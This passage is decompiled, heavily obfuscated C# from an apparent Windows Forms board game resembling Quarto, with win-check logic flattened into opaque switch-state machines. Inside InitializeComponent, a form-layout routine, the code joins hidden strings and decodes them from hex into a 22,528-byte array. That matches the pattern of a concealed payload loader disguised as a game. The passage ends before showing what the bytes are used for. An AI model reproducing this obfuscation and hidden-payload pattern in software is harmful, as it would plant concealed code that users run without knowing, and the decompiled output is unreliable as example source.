						num = (int)(num2 * 1459110689) ^ -1389241068;
						continue;
					}
					goto IL_01da;
				case 65u:
				{
					int num68;
					int num69;
					if (mem[2, 2] == null)
					{
						num68 = 196802644;
						num69 = 196802644;
					}
					else
					{
						num68 = 485161441;
						num69 = 485161441;
					}
					num = num68 ^ ((int)num2 * -2128935264);
					continue;
				}
				case 64u:
				{
					int num44;
					int num45;
					if (mem[num8, 1] != null)
					{
						num44 = 1117588442;
						num45 = 1117588442;
					}
					else
					{
						num44 = 1411276983;
						num45 = 1411276983;
					}
					num = num44 ^ (int)(num2 * 924321733);
					continue;
				}
				case 62u:
				{
					int num30;
					int num31;
					if (mem[num8, 1].Big != mem[num8, 2].Big)
					{
						num30 = -795678310;
						num31 = -795678310;
					}
					else
					{
						num30 = -806939860;
						num31 = -806939860;
					}
					num = num30 ^ (int)(num2 * 1103202303);
					continue;
				}
				case 61u:
				{
					int num17;
					int num18;
					if (mem[0, num8].Big == mem[1, num8].Big)
					{
						num17 = 1983914714;
						num18 = 1983914714;
					}
					else
					{
						num17 = 1239031316;
						num18 = 1239031316;
					}
					num = num17 ^ ((int)num2 * -436979202);
					continue;
				}
				case 60u:
				{
					int num11;
					if (mem[num8, 0].Dark == mem[num8, 1].Dark)
					{
						num = 378561046;
						num11 = 378561046;
					}
					else
					{
						num = 1398613717;
						num11 = 1398613717;
					}
					continue;
				}
				case 59u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -536091398) ^ 0x11C07951;
						continue;
					}
					goto IL_0312;
				case 58u:
				{
					int num58;
					int num59;
					if (mem[num8, 1].Square != mem[num8, 2].Square)
					{
						num58 = -1150241925;
						num59 = -1150241925;
					}
					else
					{
						num58 = -95680744;
						num59 = -95680744;
					}
					num = num58 ^ ((int)num2 * -1028417444);
					continue;
				}
				case 57u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1623891664) ^ -840690241;
						continue;
					}
					goto IL_019e;
				case 56u:
					if (mem[2, num8].Big != mem[3, num8].Big)
					{
						num = ((int)num2 * -1461981583) ^ 0x156D512E;
						continue;
					}
					goto IL_0163;
				case 55u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1172249547) ^ -757651028;
						continue;
					}
					goto IL_0312;
				case 54u:
				{
					int num40;
					int num41;
					if (mem[num8, 1].Point == mem[num8, 2].Point)
					{
						num40 = -190791277;
						num41 = -190791277;
					}
					else
					{
						num40 = -239449730;
						num41 = -239449730;
					}
					num = num40 ^ ((int)num2 * -1083125673);
					continue;
				}
				case 53u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 909252763;
						continue;
					}
					goto IL_0444;
				case 52u:
				{
					int num28;
					int num29;
					if (flag3)
					{
						num28 = -384599578;
						num29 = -384599578;
					}
					else
					{
						num28 = -1547124726;
						num29 = -1547124726;
					}
					num = num28 ^ (int)(num2 * 836399169);
					continue;
				}
				case 51u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 539539422) ^ -1690445092;
						continue;
					}
					goto IL_0312;
				case 50u:
				{
					int num9;
					int num10;
					if (mem[num8, 0].Big != mem[num8, 1].Big)
					{
						num9 = 1743022558;
						num10 = 1743022558;
					}
					else
					{
						num9 = 2147042684;
						num10 = 2147042684;
					}
					num = num9 ^ (int)(num2 * 1986826541);
					continue;
				}
				case 49u:
				{
					int num72;
					int num73;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num72 = -1015160824;
						num73 = -1015160824;
					}
					else
					{
						num72 = -68405297;
						num73 = -68405297;
					}
					num = num72 ^ (int)(num2 * 1612357917);
					continue;
				}
				case 48u:
					if (mem[2, num8] != null)
					{
						num = ((int)num2 * -19494358) ^ 0x7E6ABC09;
						continue;
					}
					goto IL_0531;
				case 47u:
				{
					int num62;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 922998100;
						num62 = 922998100;
					}
					else
					{
						num = 75032605;
						num62 = 75032605;
					}
					continue;
				}
				case 46u:
					if (mem[2, num8].Point != mem[3, num8].Point)
					{
						num = (int)((num2 * 1836509721) ^ 0x49FB47F5);
						continue;
					}
					goto IL_0163;
				case 45u:
				{
					int num54;
					int num55;
					if (mem[1, num8].Dark != mem[2, num8].Dark)
					{
						num54 = -253227147;
						num55 = -253227147;
					}
					else
					{
						num54 = -921068131;
						num55 = -921068131;
					}
					num = num54 ^ ((int)num2 * -411310152);
					continue;
				}
				case 44u:
					num34 = ((mem[2, num8].Square == mem[3, num8].Square) ? 1 : 0);
					goto IL_0164;
				case 43u:
				{
					int num53;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1367901127;
						num53 = 1367901127;
					}
					else
					{
						num = 2066962347;
						num53 = 2066962347;
					}
					continue;
				}
				case 42u:
				{
					int num48;
					int num49;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num48 = 1256945650;
						num49 = 1256945650;
					}
					else
					{
						num48 = 1713494653;
						num49 = 1713494653;
					}
					num = num48 ^ ((int)num2 * -1981933623);
					continue;
				}
				case 41u:
					if (mem[num8, 2].Dark != mem[num8, 3].Dark)
					{
						num = (int)(num2 * 1022025176) ^ -1141616627;
						continue;
					}
					goto IL_06ab;
				case 40u:
					result = flag;
					num = 510752031;
					continue;
				case 39u:
				{
					int num38;
					int num39;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num38 = -365792870;
						num39 = -365792870;
					}
					else
					{
						num38 = -674349782;
						num39 = -674349782;
					}
					num = num38 ^ (int)(num2 * 420445115);
					continue;
				}
				case 38u:
				{
					int num35;
					if (mem[0, num8].Dark == mem[1, num8].Dark)
					{
						num = 393305657;
						num35 = 393305657;
					}
					else
					{
						num = 1275686829;
						num35 = 1275686829;
					}
					continue;
				}
				case 37u:
					if (mem[1, num8].Square == mem[2, num8].Square)
					{
						num = (int)((num2 * 1380938340) ^ 0x798E823C);
						continue;
					}
					goto IL_0766;
				case 36u:
				{
					int num24;
					int num25;
					if (flag4)
					{
						num24 = -1940306589;
						num25 = -1940306589;
					}
					else
					{
						num24 = -982248623;
						num25 = -982248623;
					}
					num = num24 ^ (int)(num2 * 1933578120);
					continue;
				}
				case 35u:
				{
					int num21;
					int num22;
					if (mem[1, num8].Point != mem[2, num8].Point)
					{
						num21 = -2039766562;
						num22 = -2039766562;
					}
					else
					{
						num21 = -1742460897;
						num22 = -1742460897;
					}
					num = num21 ^ ((int)num2 * -503217261);
					continue;
				}
				case 34u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1970697345) ^ -1875561192;
						continue;
					}
					goto IL_01da;
				case 33u:
					if (mem[3, num8] != null)
					{
						num = ((int)num2 * -358143361) ^ 0x57F27C6;
						continue;
					}
					goto IL_0531;
				case 32u:
					flag3 = num8 < 4;
					num = 908170800;
					continue;
				case 31u:
				{
					int num4;
					int num5;
					if (!flag2)
					{
						num4 = -135844643;
						num5 = -135844643;
					}
					else
					{
						num4 = -1711655013;
						num5 = -1711655013;
					}
					num = num4 ^ ((int)num2 * -1725569941);
					continue;
				}
				case 30u:
				{
					int num70;
					int num71;
					if (mem[num8, 1].Dark == mem[num8, 2].Dark)
					{
						num70 = -209215209;
						num71 = -209215209;
					}
					else
					{
						num70 = -1387816345;
						num71 = -1387816345;
					}
					num = num70 ^ (int)(num2 * 1639173233);
					continue;
				}
				case 29u:
				{
					int num66;
					int num67;
					if (mem[1, 1] == null)
					{
						num66 = -99769469;
						num67 = -99769469;
					}
					else
					{
						num66 = -1163639746;
						num67 = -1163639746;
					}
					num = num66 ^ ((int)num2 * -455459197);
					continue;
				}
				case 28u:
				{
					int num60;
					int num61;
					if (mem[num8, 3] == null)
					{
						num60 = -918072069;
						num61 = -918072069;
					}
					else
					{
						num60 = -982777994;
						num61 = -982777994;
					}
					num = num60 ^ (int)(num2 * 1703055710);
					continue;
				}
				case 27u:
					if (mem[0, num8] != null)
					{
						num = 1512879991;
						continue;
					}
					goto IL_0531;
				case 26u:
				{
					int num56;
					int num57;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num56 = -1013769300;
						num57 = -1013769300;
					}
					else
					{
						num56 = -1133759792;
						num57 = -1133759792;
					}
					num = num56 ^ ((int)num2 * -1833420438);
					continue;
				}
				case 25u:
					num8++;
					num = 660404832;
					continue;
				case 24u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -762430900) ^ -562979100;
						continue;
					}
					goto IL_01da;
				case 23u:
					if (mem[0, num8].Square == mem[1, num8].Square)
					{
						num = 304740141;
						continue;
					}
					goto IL_0766;
				case 22u:
				{
					int num51;
					int num52;
					if (mem[num8, 0] == null)
					{
						num51 = -1572944609;
						num52 = -1572944609;
					}
					else
					{
						num51 = -1467660420;
						num52 = -1467660420;
					}
					num = num51 ^ ((int)num2 * -48522230);
					continue;
				}
				case 21u:
				{
					int num50;
					if (mem[num8, 0].Point != mem[num8, 1].Point)
					{
						num = 789031532;
						num50 = 789031532;
					}
					else
					{
						num = 1926408442;
						num50 = 1926408442;
					}
					continue;
				}
				case 20u:
				{
					int num46;
					int num47;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num46 = 439357455;
						num47 = 439357455;
					}
					else
					{
						num46 = 1948930477;
						num47 = 1948930477;
					}
					num = num46 ^ (int)(num2 * 90982707);
					continue;
				}
				case 19u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)((num2 * 333269891) ^ 0x1C778EC);
						continue;
					}
					goto IL_019e;
				case 18u:
				{
					int num42;
					int num43;
					if (mem[0, 0] != null)
					{
						num42 = 1859666941;
						num43 = 1859666941;
					}
					else
					{
						num42 = 2067242800;
						num43 = 2067242800;
					}
					num = num42 ^ ((int)num2 * -248216950);
					continue;
				}
				case 17u:
					if (mem[num8, 2].Point != mem[num8, 3].Point)
					{
						num = ((int)num2 * -70815636) ^ -949876880;
						continue;
					}
					goto IL_06ab;
				case 16u:
					if (mem[0, 3] != null)
					{
						num = 886038071;
						continue;
					}
					goto IL_0312;
				case 15u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -955864803) ^ 0x5F5735CF;
						continue;
					}
					goto IL_0444;
				case 14u:
				{
					int num37;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 755041411;
						num37 = 755041411;
					}
					else
					{
						num = 371181675;
						num37 = 371181675;
					}
					continue;
				}
				case 13u:
				{
					int num32;
					int num33;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num32 = -797329433;
						num33 = -797329433;
					}
					else
					{
						num32 = -551926073;
						num33 = -551926073;
					}
					num = num32 ^ (int)(num2 * 1123398829);
					continue;
				}
				case 12u:
				{
					int num26;
					int num27;
					if (mem[1, num8].Big != mem[2, num8].Big)
					{
						num26 = -1375645750;
						num27 = -1375645750;
					}
					else
					{
						num26 = -392153888;
						num27 = -392153888;
					}
					num = num26 ^ (int)(num2 * 153581282);
					continue;
				}
				case 11u:
				{
					int num23;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 243112718;
						num23 = 243112718;
					}
					else
					{
						num = 1261098895;
						num23 = 1261098895;
					}
					continue;
				}
				case 10u:
					if (mem[num8, 2].Big != mem[num8, 3].Big)
					{
						num = (int)(num2 * 898493298) ^ -10146432;
						continue;
					}
					goto IL_06ab;
				case 9u:
				{
					int num19;
					int num20;
					if (mem[3, 3] == null)
					{
						num19 = 13460611;
						num20 = 13460611;
					}
					else
					{
						num19 = 791902782;
						num20 = 791902782;
					}
					num = num19 ^ ((int)num2 * -85782325);
					continue;
				}
				case 8u:
					if (mem[num8, 2].Square != mem[num8, 3].Square)
					{
						num = (int)((num2 * 127219595) ^ 0x34F1D60F);
						continue;
					}
					goto IL_06ab;
				case 7u:
					if (mem[1, num8] != null)
					{
						num = ((int)num2 * -1506262083) ^ -185388205;
						continue;
					}
					goto IL_0531;
				case 6u:
					num = 843703458;
					continue;
				case 5u:
					num8 = 0;
					num = ((int)num2 * -1699904111) ^ 0x23A8E23D;
					continue;
				case 4u:
				{
					int num14;
					int num15;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num14 = 1210714471;
						num15 = 1210714471;
					}
					else
					{
						num14 = 2034110924;
						num15 = 2034110924;
					}
					num = num14 ^ ((int)num2 * -130090308);
					continue;
				}
				case 3u:
				{
					int num6;
					int num7;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num6 = 455609545;
						num7 = 455609545;
					}
					else
					{
						num6 = 1509725459;
						num7 = 1509725459;
					}
					num = num6 ^ (int)(num2 * 1651846000);
					continue;
				}
				case 2u:
					flag = true;
					num = (int)((num2 * 1339957321) ^ 0x68EAA472);
					continue;
				case 1u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1211492456) ^ -1690903733;
						continue;
					}
					goto IL_01da;
				case 0u:
					num3 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_019f;
				case 66u:
					break;
				default:
					{
						return result;
					}
					IL_01da:
					num3 = 1;
					goto IL_019f;
					IL_0766:
					num34 = 0;
					goto IL_0164;
					IL_019f:
					flag2 = (byte)num3 != 0;
					num = 426553475;
					continue;
					IL_019e:
					num3 = 1;
					goto IL_019f;
					IL_0444:
					num3 = 0;
					goto IL_019f;
					IL_06ab:
					num34 = 1;
					goto IL_0164;
					IL_0163:
					num34 = 1;
					goto IL_0164;
					IL_0164:
					flag4 = (byte)num34 != 0;
					num = 151428396;
					continue;
					IL_0312:
					num3 = 0;
					goto IL_019f;
					IL_0531:
					num34 = 0;
					goto IL_0164;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1635774194;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5C9C557Fu) % 16u)
				{
				case 15u:
					result = flag2;
					num = ((int)num2 * -269227479) ^ -619521165;
					continue;
				case 14u:
					flag3 = num6 < 4;
					num = 387966744;
					continue;
				case 13u:
					flag2 = true;
					num6 = 0;
					num = (int)((num2 * 766238604) ^ 0x5E666FBA);
					continue;
				case 12u:
					flag2 = false;
					num = ((int)num2 * -552461066) ^ 0x5E55117D;
					continue;
				case 11u:
					num = (int)(num2 * 1425196704) ^ -1012409458;
					continue;
				case 10u:
					num5++;
					num = 2131347292;
					continue;
				case 9u:
					num = ((int)num2 * -100796679) ^ 0x40700780;
					continue;
				case 8u:
				{
					int num9;
					if (mem[num6, num5] != null)
					{
						num = 245150645;
						num9 = 245150645;
					}
					else
					{
						num = 1503182227;
						num9 = 1503182227;
					}
					continue;
				}
				case 7u:
				{
					int num7;
					int num8;
					if (!flag3)
					{
						num7 = 1035519607;
						num8 = 1035519607;
					}
					else
					{
						num7 = 1813386588;
						num8 = 1813386588;
					}
					num = num7 ^ ((int)num2 * -935996911);
					continue;
				}
				case 5u:
					num6++;
					num = (int)(num2 * 435454253) ^ -914929424;
					continue;
				case 4u:
					num5 = 0;
					num = 1517649919;
					continue;
				case 3u:
					flag = num5 < 4;
					num = 432593581;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1021272768;
						num4 = -1021272768;
					}
					else
					{
						num3 = -502452739;
						num4 = -502452739;
					}
					num = num3 ^ ((int)num2 * -2092680619);
					continue;
				}
				case 0u:
					num = (int)(num2 * 1609182101) ^ -137298980;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 2053153974;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x43CEB4DDu) % 10u)
				{
				case 9u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)((num2 * 1555732234) ^ 0x442B45F3);
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -530732051) ^ 0x266F1B4E;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -1197392301) ^ 0x6BA47B39;
					continue;
				case 4u:
					num = ((int)num2 * -1626500726) ^ 0x2A528D78;
					continue;
				case 3u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 463167983) ^ -1933702912;
					continue;
				case 2u:
					num = (int)(num2 * 108019561) ^ -1139113356;
					continue;
				case 1u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)(num2 * 627715493) ^ -563697534;
					continue;
				case 0u:
					num = (int)(num2 * 729027085) ^ -447178968;
					continue;
				default:
					return;
				case 5u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_004a;
		}
		int num = 0;
		goto IL_00b2;
		IL_00b2:
		bool flag = (byte)num != 0;
		int num2 = -41364395;
		goto IL_0078;
		IL_004a:
		num2 = -1633644244;
		goto IL_0078;
		IL_0078:
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0xDE21E7E9u) % 8u)
			{
			case 7u:
				((Form)this).Dispose(disposing);
				num2 = -1530183080;
				continue;
			case 6u:
				num2 = ((int)num3 * -996189271) ^ 0x6E3A05C8;
				continue;
			case 4u:
			{
				int num4;
				int num5;
				if (flag)
				{
					num4 = 2136500423;
					num5 = 2136500423;
				}
				else
				{
					num4 = 693947658;
					num5 = 693947658;
				}
				num2 = num4 ^ ((int)num3 * -1775719919);
				continue;
			}
			case 3u:
				break;
			case 2u:
				num2 = (int)((num3 * 684129654) ^ 0x7A16A65);
				continue;
			case 0u:
				Form1.smethod_51((IDisposable)components);
				num2 = ((int)num3 * -1934208215) ^ -418286809;
				continue;
			default:
				return;
			case 5u:
				goto IL_00a9;
			case 1u:
				return;
			}
			break;
		}
		goto IL_004a;
		IL_00a9:
		num = ((components != null) ? 1 : 0);
		goto IL_00b2;
	}

	private void InitializeComponent()
	{
		//IL_0c7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c89: Expected O, but got Unknown
		components = Form1.smethod_52();
		bool flag = default(bool);
		int num5 = default(int);
		byte[] array = default(byte[]);
		string string_ = default(string);
		while (true)
		{
			int num = -829352718;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8CD36D5Fu) % 124u)
				{
				case 123u:
					Form1.smethod_64((Control)(object)label2, 9);
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 805707369) ^ -1985476900;
					continue;
				case 122u:
					Form1.smethod_64((Control)(object)label6, 13);
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 263141969) ^ -5847192;
					continue;
				case 121u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -1395970965) ^ 0x470CE931;
					continue;
				case 120u:
					num = (int)((num2 * 622273569) ^ 0x480E8575);
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -1513337975) ^ -1595093592;
					continue;
				case 118u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -476381852) ^ 0x9D0CB48;
					continue;
				case 117u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 655179326) ^ -1247725391;
					continue;
				case 116u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -899120119) ^ 0x4BA5E093;
					continue;
				case 115u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 1558247070) ^ -943123493;
					continue;
				case 114u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 1788440229) ^ 0x72F598BC);
					continue;
				case 113u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -1874205840) ^ -150744700;
					continue;
				case 112u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)(num2 * 1574788739) ^ -849854063;
					continue;
				case 111u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -2127342711) ^ 0x6DBF2C7A;
					continue;
				case 110u:
					num = ((int)num2 * -911267477) ^ 0x33DDB9DD;
					continue;
				case 109u:
					flag = num5 < 22528;
					num = -1286649735;
					continue;
				case 108u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -588110625) ^ -1092236760;
					continue;
				case 107u:
					num = (int)((num2 * 586341699) ^ 0x26BB31EC);
					continue;
				case 106u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1459283288) ^ -1611609970;
					continue;
				case 105u:
					num = ((int)num2 * -391796093) ^ 0x4876D518;
					continue;
				case 104u:
					num = (int)((num2 * 577092182) ^ 0x427441C4);
					continue;
				case 103u:
					num = ((int)num2 * -638870254) ^ -287602692;
					continue;
				case 102u:
					num = ((int)num2 * -919153158) ^ 0x4064A426;
					continue;
				case 101u:
					string_ = Veet.Sa;
					num = ((int)num2 * -1326166199) ^ -938608851;
					continue;
				case 100u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -665300815) ^ -690115717;
					continue;
				case 99u:
					num = (int)(num2 * 300381317) ^ -772153061;
					continue;
				case 98u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1168628321) ^ -1652731175;
					continue;
				case 97u:
					pictureBox1 = Form1.smethod_2();
					num = (int)(num2 * 507394615) ^ -1147994922;
					continue;
				case 96u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num = -1000865266;
					continue;
				case 95u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -621576272) ^ -2048068461;
					continue;
				case 94u:
					num = (int)(num2 * 247293400) ^ -998226658;
					continue;
				case 93u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1427794735) ^ 0x5FCDC985);
					continue;
				case 92u:
					num = ((int)num2 * -2009972787) ^ -840541248;
					continue;
				case 91u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)(num2 * 1927445527) ^ -903767830;
					continue;
				case 90u:
					Form1.smethod_61((Control)(object)label1, "label1");
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1763230455) ^ -1521939389;
					continue;
				case 89u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1838910366) ^ -209054781;
					continue;
				case 88u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1691782993) ^ -1158164626;
					continue;
				case 87u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -311818868) ^ -990125956;
					continue;
				case 86u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 500982161) ^ 0x58B1ADCE);
					continue;
				case 85u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -1662586910) ^ -526848283;
					continue;
				case 84u:
					num = (int)(num2 * 680979870) ^ -1854354198;
					continue;
				case 83u:
					timer1 = Form1.smethod_56(components);
					num = (int)((num2 * 1339447699) ^ 0x3C86AA0D);
					continue;
				case 82u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -2141518419) ^ -1721888918;
					continue;
				case 81u:
					num = ((int)num2 * -855779400) ^ 0x74288B70;
					continue;
				case 80u:
					num = ((int)num2 * -726093409) ^ 0x17B0E706;
					continue;
				case 79u:
					num = ((int)num2 * -858735806) ^ -1634077479;
					continue;
				case 78u:
					num = (int)(num2 * 1294471473) ^ -1017805684;
					continue;
				case 77u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 138881804) ^ -281311434;
					continue;
				case 76u:
					num5++;
					num = (int)(num2 * 928951532) ^ -108338954;
					continue;
				case 75u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 1042239596) ^ 0x18C8BF9C);
					continue;
				case 73u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 404720671) ^ 0x6490A7E2);
					continue;
				case 72u:
					num = (int)(num2 * 723756843) ^ -1247996646;
					continue;
				case 71u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = ((int)num2 * -189045787) ^ -483115754;
					continue;
				case 70u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)(num2 * 1279956589) ^ -1794326472;
					continue;
				case 69u:
					num = ((int)num2 * -326274342) ^ -1771128728;
					continue;
				case 68u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -464270571) ^ -1840867415;
					continue;
				case 67u:
					num = (int)((num2 * 613402161) ^ 0x1DD9117C);
					continue;
				case 66u:
					num5 = 0;
					num = ((int)num2 * -504514499) ^ -1078137587;
					continue;
				case 65u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -1420151533) ^ -1967840000;
					continue;
				case 64u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -533442390) ^ 0x4C3DE41D;
					continue;
				case 63u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1168936662) ^ -454825850;
					continue;
				case 62u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 698227956) ^ -1136125063;
					continue;
				case 61u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -581194116) ^ -173586036;
					continue;
				case 60u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 504835321) ^ 0x7675389F);
					continue;
				case 59u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1065949899) ^ 0x56A6454E;
					continue;
				case 58u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 1281859637) ^ 0xC13224C);
					continue;
				case 57u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 675226058) ^ 0xAEE0EBC);
					continue;
				case 56u:
					num = (int)(num2 * 1098521760) ^ -16630710;
					continue;
				case 55u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 953247464) ^ 0x1559311E);
					continue;
				case 54u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)(num2 * 1763112847) ^ -427474976;
					continue;
				case 53u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -2105191756) ^ 0x905461;
					continue;
				case 52u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 362142105) ^ -481172884;
					continue;
				case 51u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -2011830203) ^ 0x329DB79E;
					continue;
				case 50u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)((num2 * 178380137) ^ 0x4A6F75BD);
					continue;
				case 49u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -2134585930) ^ 0x6374C1EE;
					continue;
				case 48u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)(num2 * 229625644) ^ -1504616487;
					continue;
				case 47u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -234196816) ^ -1985341811;
					continue;
				case 46u:
					num = (int)(num2 * 391104262) ^ -53690050;
					continue;
				case 45u:
					num = ((int)num2 * -190210303) ^ 0x5CB0748;
					continue;
				case 44u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 964109684) ^ 0x16B4DD98);
					continue;
				case 43u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = ((int)num2 * -688879159) ^ 0x7DDA229B;
					continue;
				case 42u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -746472085;
						num4 = -746472085;
					}
					else
					{
						num3 = -1545132556;
						num4 = -1545132556;
					}
